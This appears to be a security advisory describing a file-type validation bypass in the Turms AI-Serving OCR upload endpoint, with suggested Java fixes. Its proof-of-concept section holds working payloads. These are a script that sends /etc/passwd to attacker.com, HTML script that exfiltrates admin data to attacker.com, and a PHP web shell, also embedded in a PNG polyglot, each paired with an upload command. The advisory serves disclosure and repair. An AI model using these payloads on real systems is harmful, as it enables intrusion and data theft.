# Turms AI-Serving - Image File Type Validation Bypass Vulnerability

## NAME OF AFFECTED PRODUCT(S)

- **Product**: Turms AI-Serving Module (OCR Controller)
- **Vendor Homepage**: https://github.com/turms-im/turms

## AFFECTED AND/OR FIXED VERSION(S)

- **Submitter**: s1ain
- **Affected Version(s)**: Turms v0.10.0-SNAPSHOT and earlier versions
- **Software Link**: https://github.com/turms-im/turms
- **Fixed Version**: Not fixed yet

## PROBLEM TYPE

- **Vulnerability Type**: CWE-434: Unrestricted Upload of File with Dangerous Type / CWE-646: Reliance on File Name or Extension
- **Root Cause**: The OCR controller accepts file uploads with a `@FormData(contentType = MediaTypeConst.IMAGE)` annotation, but this declaration is not actually enforced. The system does not validate file content using magic bytes or file signatures, allowing attackers to upload arbitrary file types by manipulating the Content-Type header or file extension.
- **Impact**:
  - Upload of malicious files (executables, scripts, malware)
  - Server-side code execution if uploaded files are processed or served
  - Information disclosure through upload of crafted files
  - Potential for further exploitation depending on file handling

## DESCRIPTION

An improper file type validation vulnerability exists in the Turms AI-Serving module's OCR image upload functionality. The `OcrController` declares that it accepts only image files through the `@FormData(contentType = MediaTypeConst.IMAGE)` annotation, but this constraint is not properly enforced. The system relies on client-provided Content-Type headers and file extensions without validating actual file content using magic bytes (file signatures). An attacker can upload arbitrary file types (executables, scripts, HTML, etc.) by simply setting the Content-Type header to "image/*" or using an image file extension, bypassing the intended file type restriction.

## Code Analysis

**Vulnerable Location**: `turms-ai-serving/src/main/java/im/turms/ai/domain/ocr/controller/OcrController.java`

**Vulnerable Code**:
```java
@PostMapping("/ocr")
public ResponseEntity<?> detectObjects(
        @FormData(contentType = MediaTypeConst.IMAGE) File imageFile) {
    // ← contentType annotation is not enforced!
    // No actual validation of file content
    // File is processed regardless of actual type

    // Directly passes to OCR service
    return ocrService.processImage(imageFile);
}
```

**Missing Validation**:
```java
// No magic byte validation like:
private boolean isValidImage(File file) throws IOException {
    byte[] header = Files.readAllBytes(file.toPath(), 0, 12);

    // PNG: 89 50 4E 47 0D 0A 1A 0A
    // JPEG: FF D8 FF
    // GIF: 47 49 46 38
    // BMP: 42 4D
    // TIFF: 49 49 2A 00 or 4D 4D 00 2A

    // This validation is NOT implemented!
}
```

## Authentication Requirements

The vulnerability may be exploitable without authentication depending on the deployment configuration of the OCR service. If authentication is required, any authenticated user can exploit this vulnerability.

## Vulnerability Details and POC

**Vulnerability Type**: Improper File Type Validation / Unrestricted File Upload

**Vulnerability Location**:
- File: `turms-ai-serving/src/main/java/im/turms/ai/domain/ocr/controller/OcrController.java`
- Parameter: `imageFile` with `@FormData(contentType = MediaTypeConst.IMAGE)` annotation
- Issue: Content type validation not enforced

**Proof of Concept**:

**Attack Scenario 1: Upload Executable as Image**

```bash
# Create a malicious executable file
echo '#!/bin/bash' > malicious.sh
echo 'curl http://attacker.com/?data=$(cat /etc/passwd)' >> malicious.sh

# Upload with image Content-Type header
curl -X POST http://target:8080/ocr \
  -H "Content-Type: multipart/form-data" \
  -F "imageFile=@malicious.sh;type=image/png"

# Server accepts the file because Content-Type claims it's an image
# No magic byte validation performed
```

**Attack Scenario 2: Upload HTML with Embedded JavaScript**

```bash
# Create HTML file with JavaScript
cat > fake_image.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<script>
    // If this file is served back to users, XSS occurs
    fetch('/admin/api/users').then(r => r.json()).then(data => {
        fetch('http://attacker.com/steal?data=' + JSON.stringify(data));
    });
</script>
</body>
</html>
EOF

# Upload with .png extension and image MIME type
curl -X POST http://target:8080/ocr \
  -F "imageFile=@fake_image.html;type=image/png;filename=image.png"

# File accepted and stored
```

**Attack Scenario 3: Upload PHP Web Shell**

```bash
# Create PHP web shell
cat > shell.php << 'EOF'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Upload disguised as image
curl -X POST http://target:8080/ocr \
  -F "imageFile=@shell.php;type=image/jpeg;filename=photo.jpg"

# If uploads directory is web-accessible, attacker can execute commands
# http://target:8080/uploads/shell.php?cmd=whoami
```

**Attack Scenario 4: Polyglot File (Valid Image + Malicious Payload)**

```python
# Create a polyglot file that is both a valid PNG and contains code
import struct

# PNG header
png_header = b'\x89PNG\r\n\x1a\n'

# Minimal PNG IHDR chunk
ihdr = b'IHDR' + struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_chunk = struct.pack('>I', len(ihdr)) + ihdr + struct.pack('>I', 0)

# Embed malicious payload in PNG comment chunk
payload = b'<?php system($_GET["cmd"]); ?>'
comment_chunk = struct.pack('>I', len(payload)) + b'tEXt' + payload + struct.pack('>I', 0)

# PNG IEND chunk
iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', 0)

# Combine to create polyglot
with open('polyglot.png', 'wb') as f:
    f.write(png_header + ihdr_chunk + comment_chunk + iend)

# This file passes as valid PNG AND contains PHP code
# Upload: curl -F "file=@polyglot.png" http://target:8080/ocr
```

## Attack Results

Successful exploitation results in:
- Bypass of file type restrictions
- Upload of malicious files to server storage
- Potential server-side code execution if uploaded files are processed
- Stored XSS if uploaded files are served to other users
- Information disclosure through specially crafted files
- Server resource consumption with large or malformed files
- Staging ground for further attacks

## Suggested Repair

1. **Implement Magic Byte Validation** (Primary fix):
```java
import java.nio.file.Files;

private static final Map<String, byte[]> IMAGE_SIGNATURES = Map.of(
    "PNG", new byte[]{(byte)0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
    "JPEG", new byte[]{(byte)0xFF, (byte)0xD8, (byte)0xFF},
    "GIF87a", new byte[]{0x47, 0x49, 0x46, 0x38, 0x37, 0x61},
    "GIF89a", new byte[]{0x47, 0x49, 0x46, 0x38, 0x39, 0x61},
    "BMP", new byte[]{0x42, 0x4D},
    "TIFF_LE", new byte[]{0x49, 0x49, 0x2A, 0x00},
    "TIFF_BE", new byte[]{0x4D, 0x4D, 0x00, 0x2A}
);

private boolean isValidImageFile(File file) throws IOException {
    if (!file.exists() || file.length() == 0) {
        return false;
    }

    // Read first 12 bytes for signature checking
    byte[] header = new byte[12];
    try (InputStream is = new FileInputStream(file)) {
        int read = is.read(header);
        if (read < 4) {
            return false;
        }
    }

    // Check against known image signatures
    for (byte[] signature : IMAGE_SIGNATURES.values()) {
        if (startsWith(header, signature)) {
            return true;
        }
    }

    return false;
}

private boolean startsWith(byte[] array, byte[] prefix) {
    if (array.length < prefix.length) {
        return false;
    }
    for (int i = 0; i < prefix.length; i++) {
        if (array[i] != prefix[i]) {
            return false;
        }
    }
    return true;
}

@PostMapping("/ocr")
public ResponseEntity<?> detectObjects(
        @FormData(contentType = MediaTypeConst.IMAGE) File imageFile) {

    // Validate file content
    if (!isValidImageFile(imageFile)) {
        throw new InvalidFileTypeException(
            "File is not a valid image format"
        );
    }

    // Additional validation: verify with image library
    try {
        BufferedImage image = ImageIO.read(imageFile);
        if (image == null) {
            throw new InvalidFileTypeException(
                "File could not be parsed as an image"
            );
        }
    } catch (IOException e) {
        throw new InvalidFileTypeException(
            "File is not a valid image", e
        );
    }

    return ocrService.processImage(imageFile);
}
```

2. **Use Apache Tika for Content Type Detection**:
```java
import org.apache.tika.Tika;

private boolean isValidImage(File file) throws IOException {
    Tika tika = new Tika();
    String detectedType = tika.detect(file);
    return detectedType != null && detectedType.startsWith("image/");
}
```

3. **Validate File Extensions** (secondary defense):
```java
private static final Set<String> ALLOWED_EXTENSIONS = Set.of(
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp"
);

private boolean hasValidExtension(File file) {
    String filename = file.getName().toLowerCase();
    return ALLOWED_EXTENSIONS.stream()
        .anyMatch(filename::endsWith);
}
```

4. **Additional Security Measures**:
   - Store uploaded files outside web root
   - Use randomized filenames
   - Set Content-Disposition: attachment headers when serving files
   - Implement file size limits
   - Scan uploaded files with antivirus
   - Use Content Security Policy headers

5. **Defense in Depth**:
```java
public void validateUpload(File file) {
    // Layer 1: Extension check
    if (!hasValidExtension(file)) {
        throw new InvalidFileTypeException("Invalid file extension");
    }

    // Layer 2: Magic byte validation
    if (!isValidImageFile(file)) {
        throw new InvalidFileTypeException("Invalid file signature");
    }

    // Layer 3: Actual image parsing
    if (!canParseAsImage(file)) {
        throw new InvalidFileTypeException("File is not a parseable image");
    }

    // Layer 4: Size validation
    if (file.length() > MAX_FILE_SIZE) {
        throw new FileTooLargeException("File exceeds size limit");
    }
}
```

## CVSS Score

**CVSS v3.1**: 5.3 (Medium)
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): None
- User Interaction (UI): None
- Scope (S): Unchanged
- Confidentiality (C): Low
- Integrity (I): None
- Availability (A): None

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Note: Score could be higher (up to Critical) if uploaded files can be executed or served back to users, depending on server configuration and file handling implementation.

## References

- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-646: Reliance on File Name or Extension
- OWASP: Unrestricted File Upload
- File Signature Database: https://www.filesignatures.net/
